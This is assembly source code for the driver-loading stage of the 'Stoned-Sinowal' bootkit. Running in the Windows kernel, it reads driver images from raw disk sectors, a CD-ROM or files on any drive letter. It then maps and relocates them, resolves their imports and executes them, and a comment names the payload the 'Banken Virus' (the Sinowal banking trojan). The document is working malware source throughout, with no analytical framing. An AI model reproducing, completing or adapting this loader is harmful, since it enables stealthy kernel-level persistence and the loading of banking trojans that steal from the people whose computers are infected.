
;  Stoned-Sinowal Bootkit [Driver Code]

;  development done by Peter Kleissner


Driver_Code:

; [ebp - 32] = data reference


; store the ntoskrnl base address
mov esi,[ebp - 32] 
mov [esi + Ntoskrnl_BaseAddress - Data_Reference],ebx                           ; NT-kernel base address

; allocate a memory pool (1024 bytes) for the Stoned Subsystem

; nt!ExAllocatePool(Type 0, 1024 bytes)
push dword 1024                                                                 ; NumberOfBytes = 1024 bytes
push dword 0                                                                    ; PoolType = 0
call dword [ebp - 24]                                                           ; ExAllocatePool()

or eax,eax                                                                      ; valid buffer?
jz Exit_Bootkit

mov [esi + Memory_Pool - Data_Reference],eax                                    ; Memory Pool variable
mov [esi + Callback_NotifyDriverLoad - Data_Reference],dword 0                  ; reset NotifyDriverLoad() callback


; load all drivers from the loading table =)
mov esi,[ebp - 32]                                                              ; data pointer
add esi,Driver_Loading_Table - Data_Reference -13                               ; parse the driver loading table

Load_Windows_Driver:
add esi,13                                                                      ; load next driver
mov ebx,esi                                                                     ; pointer to the driver loading descriptor for Load_Execute_Driver

; insert the file pointer
mov eax,[ebp - 32]                                                              ; eax will hold the immediate file name
cmp [esi],dword 0                                                               ; terminator
je Exit_Bootkit
test [esi + 12],byte 00001000b                                                  ; executable or library?
jnz Load_Windows_File_Executable

Load_Windows_File_Driver:
cmp [esi],dword 1                                                               ; \??\PhysicalDrive0
je Load_Windows_Driver_1
cmp [esi],dword 2                                                               ; \??\.\D:
je Load_Windows_Driver_2
cmp [esi],dword 3                                                               ; File Name
je Load_Windows_Driver_3
jmp Exit_Bootkit

Load_Windows_File_Executable:
cmp [esi],dword 3                                                               ; File Name (only if file name correct the file name pointer)
jne Load_Windows_Driver
add eax,[esi + 4]                                                               ; set the pointer to the file name (which must be relative to Data_Reference!)
mov [esi + 4],dword eax
jmp Load_Windows_Driver

Load_Windows_Driver_1:
add eax,File_ID_DiskDrive - Data_Reference                                      ; set the pointer to \??\PhysicalDrive0
mov [esi],dword eax
call Load_Execute_Driver
jmp Load_Windows_Driver

Load_Windows_Driver_2:
add eax,File_ID_CDROM - Data_Reference                                             ; set the pointer to \??\.\D:
mov [esi],dword eax
shl dword [esi + 4],byte 2                                                      ; factor 4 (2048 / 512)
call Load_Execute_Driver
jmp Load_Windows_Driver

Load_Windows_Driver_3:
add eax,[esi + 4]                                                               ; set the pointer to the file name (which must be relative to Data_Reference!)
mov [esi],dword eax
mov [esi + 4],dword 0                                                           ; start from zero
call Load_Execute_Driver
jmp Load_Windows_Driver



; return from bootkit to Windows
Exit_Bootkit:

; restore the register contents and exit
mov esp,ebp                                                                     ; delete stack variables
popfd
popad

; no no no...
ret                                                                             ;  :(






Load_Execute_Driver:

; Input
;   ebx = pointer to driver loading descriptor
;         + 00h   File Name (will be overwritten with the file handle)
;         + 04h   Sector Number (will be overwritten with the file base in memory)
;         + 0Ch   Loading bits
;                   Bit 0: relocate the image
;                   Bit 1: resolve imports
;                   Bit 2: entry point

pushad


; set up data buffers (IoStatusBlock, FileHandle)
xor eax,eax
push eax                                                                        ; IoStatusBlock
push eax                                                                        ; IoStatusBlock
mov edi,esp                                                                     ; edi points to 2 dwords data buffer (zeroed out)

; set up correct ObjectName (UNICODE_STRING structure)
mov esi,[ebx + 0]                                                               ; File Name
push esi                                                                        ; &length
add [esp],dword 4                                                               ;         +4 = address of unicode string
push dword [esi]                                                                ; store length
mov esi,esp

; set ObjectAttributes on stack
push eax                                                                        ; SecurityQualityOfService  = NULL
push eax                                                                        ; SecurityDescriptor        = NULL
push dword 00000240h                                                            ; Attributes                = OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE
push esi                                                                        ; ObjectName                = "\??\PhysicalDrive0" or "\??\C:\Stoned\Drivers\Sinowal.sys"
push eax                                                                        ; RootDirectory             = NULL
push dword 24                                                                   ; Length                    = sizeof(OBJECT_ATTRIBUTES)
mov esi,esp

; ZwCreateFile(&FileHandle, GENERIC_READ | SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock, 0, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL)
Load_ZwCreateFile:
push eax                                                                        ; EaLength          = NULL
push eax                                                                        ; EaBuffer          = NULL
push dword 00000020h                                                            ; OpenOptions       = FILE_SYNCHRONOUS_IO_NONALERT
push dword 00000001h                                                            ; CreateDisposition = FILE_OPEN
push dword 00000003h                                                            ; ShareAccess       = FILE_SHARE_READ | FILE_SHARE_WRITE
push eax                                                                        ; FileAttributes    = 0
push eax                                                                        ; AllocationSize    = 0 (automatic)
push edi                                                                        ; IoStatusBlock     = data buffer on stack
push esi                                                                        ; ObjectAttributes  = data buffer on stack
push dword 80100000h                                                            ; DesiredAccess     = GENERIC_READ | SYNCHRONIZE
push ebx                                                                        ; FileHandle        = former file name
call dword near [ebp-8]                                                         ; ebp - 2*4 = ZwCreateFile (was previosuly ZwOpenFile)

or eax,eax                                                                      ; STATUS_SUCCESS = 0
jz Load_Execute_Driver_File_OK

cmp [ebx + 0],dword 0                                                           ; try only CZ if loading fails on file
jne Load_Execute_Driver_File_Not_Found

; try all drive letters (CZ)
mov eax,[esp + 7*4]                                                             ; get the pointer to the file name ("\??\C:\...")
cmp [eax + 2*4],byte 'Z'                                                        ; already reached last letter?
je Load_Execute_Driver_File_Not_Found
inc byte [eax + 2*4]                                                            ; next letter, +1
xor eax,eax
jmp Load_ZwCreateFile

Load_Execute_Driver_File_Not_Found:
add esp,8*4                                                                     ; remove stack allocated parameters
jmp Exit_Kernel_Code_Cleanup_0

Load_Execute_Driver_File_OK:
add esp,8*4                                                                     ; remove stack allocated parameters
push dword [ebx + 0]                                                            ; store handle for later ZwClose function

; ntoskrnl!ExAllocatePool(Type 0, 8 KB);
push dword 0x2000                                                               ; Size      = 8192 bytes
push eax                                                                        ; Type      = 0
call dword near [ebp-24]                                                        ; ebp - 6*4 = ExAllocatePool

or eax,eax                                                                      ; invalid buffer?
jz Exit_Kernel_Code_Cleanup_1
push eax                                                                        ; 8 KB buffer for later usage
mov esi,eax                                                                     ; us it now to load the PE Header


; calculate the Byte Offset
push ebx
mov eax,[ebx + 4]                                                               ; Byte Offset = Sector Number
mov ebx,512                                                                     ;                             * 512
mul ebx                                                                         ; result = edx:eax
pop ebx
push edx                                                                        ; store high dword of ByteOffset
push eax                                                                        ; store low dword of ByteOffset
mov edx,esp                                                                     ; edx = pointer Byte Offset

mov [edi],dword 0
mov [edi+4],dword 0

; ntoskrnl!ZwReadFile(FileHandle, NULL, NULL, NULL, &IoStatusBlock, Buffer, 8 KB, from file begin, 0);
; (this reads headers from the driver from end of hard disk)
xor eax,eax
push eax                                                                        ; Key           = 0 (no unlocking key needed)
push edx                                                                        ; ByteOffset    = sector after last partition + 25
push dword 0x2000                                                               ; Length        = 8 KB, this is the allocated size
push esi                                                                        ; Buffer        = buffer address
push edi                                                                        ; IoStatusBlock = still same as on ZwOpenFile
push eax                                                                        ; ApcContext    = NULL (no async procedure param)
push eax                                                                        ; ApcRoutine    = NULL (no async procedure call)
push eax                                                                        ; Event         = NULL (do nothing)
push dword [ebx + 0]                                                            ; FileHandle    = returned by ZwCreateFile
call dword near [ebp-4]                                                         ; ebp - 1*4 = ZwReadFile

; verify valid PE Image
or eax,eax
jnz Exit_Kernel_Code_Cleanup_3
cmp word [esi],'MZ'                                                             ; verify PE Image
jnz Exit_Kernel_Code_Cleanup_3

; go trough all sections to get the raw size of file (file end pointer)
mov edx,[esi+0x3c]                                                              ; skip DOS Header/Stub
add edx,esi                                                                     ;  (absolute address)
mov esi,[edx+0x50]                                                              ; SizeOfImage
movzx ecx,word [edx+6]                                                          ; NumberOfSections
add edx,248                                                                     ; -> first Section Table

Next_Section_Table_Entry:
cmp [edx+0x14],eax                                                              ; PointerToRawData less than current end-pointer?
jc Section_Data_Verified
mov eax,[edx+0x14]                                                              ; -> PointerToRawData
add eax,[edx+0x10]                                                              ;                      + SizeOfRawData = pointer to after last section (file end)
Section_Data_Verified:
add edx,byte +0x28                                                              ; + sizeof(Section Table Entry) = +40
loop Next_Section_Table_Entry

; eax contains now the pointer to after the last section
or eax,eax
jz Exit_Kernel_Code_Cleanup_3                                                   ; if not -> exit
xchg eax,esi                                                                    ; =>  eax = SizeOfImage, esi = file end


; ntoskrnl!ExAllocatePool(Type 0, SizeOfImage);
push eax                                                                        ; Size      = SizeOfImage
push byte +0x0                                                                  ; Type      = 0
call dword near [ebp-24]                                                        ; ebp - 6*4 = ExAllocatePool

; invalid?
or eax,eax
jz Exit_Kernel_Code_Cleanup_3
push eax                                                                        ; [esp] = pointer to driver memory

; get alignment of file end pointer of 512
add esi,000001FFh                                                               ; round up to 512
and esi,0FFFFFE00h                                                              ; unmask first 9 bits -> get base rounded up to 512 bytes

; ntoskrnl!ExAllocatePool(Type 0, up to file end), this allocates driver memory
push esi                                                                        ; Size      = esi
push byte +0x0                                                                  ; Type      = 0
call dword near [ebp-24]                                                        ; ebp - 6*4 = ExAllocatePool

; invalid?
or eax,eax
jz Exit_Kernel_Code_Cleanup_4

push eax                                                                        ; [esp] = pointer to allocated memory for reading the driver temporarily
; Stack:
; [esp]       361   426   pointer to allocated memory for reading driver
; [esp + 4]   346   40F   pointer to driver memory
; [esp + 8]   289   3B1   2 dwords byte offset of driver on hard disk
; [esp + 16]  249   363   pointer to allocated memory for temporary headers (8 KB)
xor ecx,ecx
lea edx,[esp+0x8]                                                               ; edx points to same byte offset as on last ZwReadFile (again, read the driver, but now the entire)

; ntoskrnl!ZwReadFile(FileHandle, NULL, NULL, NULL, &IoStatusBlock, Buffer, Length, ByteOffset, 0);
; (this reads the driver temporarily into memory, after that, the sections and everything has to be relocated)
push ecx                                                                        ; Key           = 0 (no unlocking key needed)
push edx                                                                        ; ByteOffset    = same as on last ZwReadFile
push esi                                                                        ; Length        = size of allocated buffer
push eax                                                                        ; Buffer        = allocated buffer
xchg eax,esi                                                                    ;   -> esi will point later to read memory
push edi                                                                        ; IoStatusBlock = again still same as on ZwOpenFile
push ecx                                                                        ; ApcContext    = NULL (no async procedure param)
push ecx                                                                        ; ApcRoutine    = NULL (no async procedure call)
push ecx                                                                        ; Event         = NULL (do nothing)
push dword [ebx + 0]                                                            ; FileHandle    = returned by ZwCreateFile
call dword near [ebp-4]                                                         ; ebp - 1*4 = ZwReadFile

; invalid?
or eax,eax
jnz Exit_Kernel_Code_Cleanup_5

; copy the headers
mov edx,[esi+0x3c]                                                              ; skip DOS Header/Stub
add edx,esi                                                                     ; (absolute address)
mov [ebx + 4],dword esi                                                         ;  -> ebx is base pointer passed to driver.. (undocumented) (store the file base)
mov ecx,[edx+0x54]                                                              ; SizeOfHeaders
mov edi,[esp+0x4]                                                               ; edi = target = driver memory (was pushed on line 346)

pushad
rep movsb                                                                       ; -> from MZ Header copy SizeOfHeaders bytes to driver memory
popad

; copy all sections in a loop
movzx ecx,word [edx+6]                                                          ; NumberOfSections (word)
push edx                                                                        ; store PE base image address for later usage
add edx,248                                                                     ; first Section Table

; copy the sections
Copy_Next_Section:
pushad
add esi,[edx+0x14]                                                              ; PointerToRawData
add edi,[edx+12]                                                                ; VirtualAddress = target
mov ecx,[edx+0x10]                                                              ; SizeOfRawData
jecxz Section_Copied
rep movsb                                                                       ; copy raw section
Section_Copied:
popad
add edx,byte +0x28                                                              ; + sizeof(Section Table Entry)
loop Copy_Next_Section


; relocate the PE image
mov esi,[esp]                                                                   ; esi = pointer to PE Header
test [ebx + 12],dword 00000001b                                                 ; relocate the image? (bit 0)
jz Driver_Relocated
call Relocate_Executable
Driver_Relocated:

; resolve IAT
test [ebx + 12],dword 00000010b                                                 ; resolve IAT? (bit 1)
jz Driver_Resolved
call Resolve_IAT
Driver_Resolved:

; notify on newly loaded image?
mov eax,[ebp - 32]                                                              ; data pointer
add eax,Callback_NotifyDriverLoad - Data_Reference                              ; callback
cmp [eax],dword 0
jz End_NotifyDriverLoad

; NotifyDriverLoad(void * Module Address, void * Entry Point, unsigned SizeOfImage);
mov esi,[esp]                                                                   ; esi = pointer to PE Header
push dword [esi+50h]                                                            ; SizeOfImage
push dword [esi+24+16]                                                          ; EntryPoint
push edi                                                                        ; param 1 = Module Address of executable
call dword [eax]                                                                ; call the callback
End_NotifyDriverLoad:



; execute the "Banken Virus" =)
test [ebx + 12],dword 00000100b                                                 ; normal entry point? (bit 2)
jz DriverEntry_Normal


DriverEntry_Stoned:

; StonedEntry(Module Address, Stoned Callback);
mov ebx,[ebx + 4]                                                               ; ebx = file base [undocumented]
pop edx                                                                         ; restore PE Image base address
push dword [ebp - 32]                                                           ; data pointer (ref)
add [esp],dword Stoned_Callback - Data_Reference                                ; pointer to Stoned Callback
push edi                                                                        ; param 1 = Module Address of executable
mov eax,[edx+24+16]                                                             ; eax = AddressOfEntryPoint
add eax,edi                                                                     ;   absolute address
call eax                                                                        ; execute the code

jmp Exit_Load_Driver


DriverEntry_Normal:
pop edx                                                                         ; restore PE Image base address
mov edx,[edx+0x28]                                                              ; PE Header AddressOfEntryPoint
add edx,edi                                                                     ;  (absolute address)
mov eax,[ebp-28]                                                                ; PsLoadedModuleList stored on stack frame data

; DriverEntry(Module Address, PsLoadedModuleList Address);
push eax                                                                        ; PsLoadedModuleList
push edi                                                                        ; Module Address
call edx                                                                        ; EntryPoint address


Exit_Load_Driver:

; ExFrePool(temp memory for reading the driver);
call dword near [ebp-20]                                                        ; ebp - 5*4 = ExFrePool

pop eax                                                                         ; -> driver memory (where driver is executed now at)
jmp short Exit_Kernel_Code_Cleanup_3


Exit_Kernel_Code_Cleanup_5:

; ExFrePool(temp memory for reading the driver);
call dword near [ebp-20]                                                        ; ebp - 5*4 = ExFrePool

Exit_Kernel_Code_Cleanup_4:

; ExFrePool(driver memory);
call dword near [ebp-20]                                                        ; ebp - 5*4 = ExFrePool

Exit_Kernel_Code_Cleanup_3:

; clean up... (remove ByteOffset from stack)
add esp,8

Exit_Kernel_Code_Cleanup_2:

; ExFrePool(8 KB memory)
call dword near [ebp-20]                                                        ; ebp - 5*4 = ExFrePool

Exit_Kernel_Code_Cleanup_1:

; ZwClose(handle to \??\PhysicalDrive0);
call dword near [ebp-12]                                                        ; ebp - 3*4 = ZwClose

Exit_Kernel_Code_Cleanup_0:

; clean up... remove IoStatusBlock (8 bytes)
add esp,8

Exit_Kernel_Code:

popad

ret






; data following, [ebp - 32] will point to here
Data_Reference:

Subsystem_Variables:
Ntoskrnl_BaseAddress        dd  0
Callback_NotifyDriverLoad   dd  0
Memory_Pool                 dd  0

; variables to the Driver Loading Table
;         + 00h   Drive
;                   1 = \??\PhysicalDrive0
;                   2 = \??\CdRom0
;                   3 = File Name (relative to Data_Reference)
;         + 04h   Sector Number (or file name pointer)
;         + 08h   Size
;         + 0Ch   Loading bits
;                   Bit 0: Relocate the image
;                   Bit 1: Resolve imports
;                   Bit 2: Entry point
;                   Bit 3: Executable (= 1) or dll
;                   Bit 4: Execute under winlogon.exe (= 1) or explorer.exe (executable only)
Driver_Loading_Table:
dq 0, 0, 0, 0, 0, 0, 0, 0    ; preserve space [max. 3 drivers]

; \??\PhysicalDrive0
File_ID_DiskDrive       dd    00260024h                     ; 2*18 = size, 2*19 = max size (counted string)
                        dw    "\","?","?","\","P","h","y","s","i","c","a","l","D","r","i","v","e","0",0

; \??\CdRom0
File_ID_CDROM           dd    00160014h                     ; 2*10 = size, 2*11 = max size (counted string)
                        dw    "\","?","?","\","C","d","R","o","m","0",0;

; possible static file names must come here!
